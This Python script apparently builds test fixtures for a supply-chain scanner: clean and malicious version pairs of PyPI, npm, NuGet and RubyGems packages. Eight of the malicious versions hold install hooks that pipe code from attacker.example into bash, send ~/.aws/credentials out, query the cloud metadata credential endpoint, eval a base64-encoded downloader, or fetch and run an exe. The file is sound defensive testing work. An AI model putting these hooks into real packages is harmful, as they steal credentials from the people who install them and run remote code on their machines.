"""Generates synthetic malicious package pairs for version-diff acceptance tests.

Each "case" yields two zip/tarball files representing an old (presumed clean)
version and a new (introduced-malware) version. Cases are intentionally clear
positives — the scanner MUST flag SUSPICIOUS or MALICIOUS for every case.
"""

from __future__ import annotations

import io
import json
import os
import sys
import tarfile
import zipfile
from pathlib import Path

OUT = Path(__file__).parent / "out"
OUT.mkdir(exist_ok=True)


def write_wheel(path: Path, files: dict[str, str]):
    with zipfile.ZipFile(path, "w") as zf:
        for n, c in files.items():
            zf.writestr(n, c)


def write_sdist(path: Path, files: dict[str, str]):
    with tarfile.open(path, "w:gz") as tf:
        for n, c in files.items():
            blob = c.encode()
            info = tarfile.TarInfo(name=n)
            info.size = len(blob)
            tf.addfile(info, io.BytesIO(blob))


def write_npm(path: Path, files: dict[str, str]):
    with tarfile.open(path, "w:gz") as tf:
        for n, c in files.items():
            blob = c.encode()
            info = tarfile.TarInfo(name=f"package/{n}")
            info.size = len(blob)
            tf.addfile(info, io.BytesIO(blob))


CASES = [
    # 1. PyPI: setup.py introduces curl-pipe-sh
    ("pypi-curl-pipe-sh",
     "pypi", "evil-curl", "1.0.0", "1.1.0",
     {"old": ("sdist", {"evil-curl-1.0.0/setup.py": "from setuptools import setup\nsetup(name='evil-curl', version='1.0.0')\n"}),
      "new": ("sdist", {"evil-curl-1.1.0/setup.py": "from setuptools import setup\nimport os\nos.system('curl https://attacker.example/install.sh | bash')\nsetup(name='evil-curl', version='1.1.0')\n"})}),
    # 2. PyPI: .pth file with import-hook
    ("pypi-pth-import-hook",
     "pypi", "evil-pth", "0.5", "0.6",
     {"old": ("wheel", {"evil_pth/__init__.py": "x=1"}),
      "new": ("wheel", {"evil_pth/__init__.py": "x=1", "evil_pth.pth": "import os; os.system('python -c \"import urllib.request as r; r.urlopen(\\\"https://attacker.example/x\\\")\"')"})}),
    # 3. NPM: postinstall changes from echo to evil
    ("npm-postinstall-evil",
     "npm", "evil-npm", "1.0.0", "1.1.0",
     {"old": ("npm", {"package.json": json.dumps({"name": "evil-npm", "version": "1.0.0", "scripts": {"postinstall": "echo ok"}}), "index.js": "module.exports = {};"}),
      "new": ("npm", {"package.json": json.dumps({"name": "evil-npm", "version": "1.1.0", "scripts": {"postinstall": "node -e 'require(\"child_process\").exec(\"curl https://attacker.example | bash\")'"}}), "index.js": "module.exports = {};"})}),
    # 4. PyPI: credential read from ~/.aws
    ("pypi-aws-cred-read",
     "pypi", "evil-aws", "2.0", "2.1",
     {"old": ("sdist", {"evil-aws-2.0/setup.py": "from setuptools import setup; setup()", "evil-aws-2.0/evil_aws/__init__.py": "VERSION='2.0'"}),
      "new": ("sdist", {"evil-aws-2.1/setup.py": "from setuptools import setup\nimport os, urllib.request, base64\nwith open(os.path.expanduser('~/.aws/credentials')) as f:\n    data = base64.b64encode(f.read().encode()).decode()\nurllib.request.urlopen('https://attacker.example/x?d='+data)\nsetup()\n", "evil-aws-2.1/evil_aws/__init__.py": "VERSION='2.1'"})}),
    # 5. PyPI: IMDS query
    ("pypi-imds-query",
     "pypi", "evil-imds", "1.0", "1.1",
     {"old": ("wheel", {"evil_imds/__init__.py": "x=1"}),
      "new": ("wheel", {"evil_imds/__init__.py": "x=1", "evil_imds.pth": "import urllib.request; urllib.request.urlopen('http://169.254.169.254/latest/meta-data/iam/security-credentials/')"})}),
    # 6. NPM: base64+exec in install
    ("npm-base64-exec",
     "npm", "evil-b64", "1.0", "1.1",
     {"old": ("npm", {"package.json": json.dumps({"name": "evil-b64", "version": "1.0", "scripts": {"install": "echo ok"}}), "index.js": "module.exports = {};"}),
      "new": ("npm", {"package.json": json.dumps({"name": "evil-b64", "version": "1.1", "scripts": {"install": "node -e \"eval(Buffer.from('cmVxdWlyZSgnY2hpbGRfcHJvY2VzcycpLmV4ZWMoJ2N1cmwgaHR0cHM6Ly9hdHRhY2tlci5leGFtcGxlIHwgYmFzaCcpO0Aw','base64').toString())\""}}), "index.js": "module.exports = {};"})}),
    # 7. NuGet: install.ps1 introduces network call
    ("nuget-install-ps1-network",
     "nuget", "evil-nuget", "1.0", "1.1",
     {"old": ("nupkg", {"tools/install.ps1": "Write-Host 'Installed'", "lib/net6.0/evil.dll": "dummy"}),
      "new": ("nupkg", {"tools/install.ps1": "Invoke-WebRequest -Uri 'https://attacker.example/x.exe' -OutFile $env:TEMP/x.exe; Start-Process $env:TEMP/x.exe", "lib/net6.0/evil.dll": "dummy"})}),
    # 8. RubyGems: extconf.rb spawns subprocess
    ("rubygems-extconf-spawn",
     "rubygems", "evil-gem", "1.0", "1.1",
     {"old": ("gem", {"ext/native/extconf.rb": "require 'mkmf'\ncreate_makefile('evil')\n", "lib/evil.rb": "module Evil; VERSION='1.0'; end"}),
      "new": ("gem", {"ext/native/extconf.rb": "require 'mkmf'\nsystem('curl https://attacker.example/payload.sh | bash')\ncreate_makefile('evil')\n", "lib/evil.rb": "module Evil; VERSION='1.1'; end"})}),
    # 9. PyPI: minor version bump only — must NOT be flagged
    ("pypi-clean-bump",
     "pypi", "clean-bump", "1.0", "1.1",
     {"old": ("wheel", {"clean_bump/__init__.py": "VERSION='1.0'"}),
      "new": ("wheel", {"clean_bump/__init__.py": "VERSION='1.1'"})}),
    # 10. NPM: docs change only — must NOT be flagged
    ("npm-clean-docs",
     "npm", "clean-docs", "1.0", "1.1",
     {"old": ("npm", {"package.json": json.dumps({"name": "clean-docs", "version": "1.0"}), "index.js": "module.exports = {};", "README.md": "# v1.0"}),
      "new": ("npm", {"package.json": json.dumps({"name": "clean-docs", "version": "1.1"}), "index.js": "module.exports = {};", "README.md": "# v1.1\n\nNew section explaining feature X."})}),
]


def write_case(case_id, ecosystem, name, old_ver, new_ver, files):
    case_dir = OUT / case_id
    case_dir.mkdir(exist_ok=True)
    for side, (fmt, fmap) in files.items():
        if fmt == "wheel":
            p = case_dir / f"{side}.whl"
            write_wheel(p, fmap)
        elif fmt == "sdist":
            p = case_dir / f"{side}.tar.gz"
            write_sdist(p, fmap)
        elif fmt == "npm":
            p = case_dir / f"{side}.tgz"
            write_npm(p, fmap)
        elif fmt == "nupkg":
            p = case_dir / f"{side}.nupkg"
            write_wheel(p, fmap)  # nupkg is zip
        elif fmt == "gem":
            p = case_dir / f"{side}.gem"
            inner = io.BytesIO()
            with tarfile.open(fileobj=inner, mode="w:gz") as inner_tf:
                for fn, fc in fmap.items():
                    blob = fc.encode()
                    info = tarfile.TarInfo(name=fn); info.size = len(blob)
                    inner_tf.addfile(info, io.BytesIO(blob))
            inner_blob = inner.getvalue()
            with tarfile.open(p, "w") as outer:
                info = tarfile.TarInfo(name="data.tar.gz"); info.size = len(inner_blob)
                outer.addfile(info, io.BytesIO(inner_blob))
                meta = b'{"name":"' + name.encode() + b'"}'
                info2 = tarfile.TarInfo(name="metadata.gz"); info2.size = len(meta)
                outer.addfile(info2, io.BytesIO(meta))


def main():
    for case_id, eco, name, old_ver, new_ver, files in CASES:
        write_case(case_id, eco, name, old_ver, new_ver, files)
    print(f"Wrote {len(CASES)} cases to {OUT}")
    # Emit a manifest CSV the replay tool can consume.
    manifest = OUT / "cases.csv"
    with manifest.open("w") as f:
        f.write("case_id,ecosystem,name,old_version,new_version,old_path,new_path,expected_verdict\n")
        for case_id, eco, name, old_ver, new_ver, files in CASES:
            old_fmt = files["old"][0]; new_fmt = files["new"][0]
            ext = {"wheel": ".whl", "sdist": ".tar.gz", "npm": ".tgz", "nupkg": ".nupkg", "gem": ".gem"}
            expected = "CLEAN" if "clean" in case_id else "SUSPICIOUS"
            f.write(f"{case_id},{eco},{name},{old_ver},{new_ver},{OUT}/{case_id}/old{ext[old_fmt]},{OUT}/{case_id}/new{ext[new_fmt]},{expected}\n")
    print(f"Wrote manifest {manifest}")


if __name__ == "__main__":
    main()
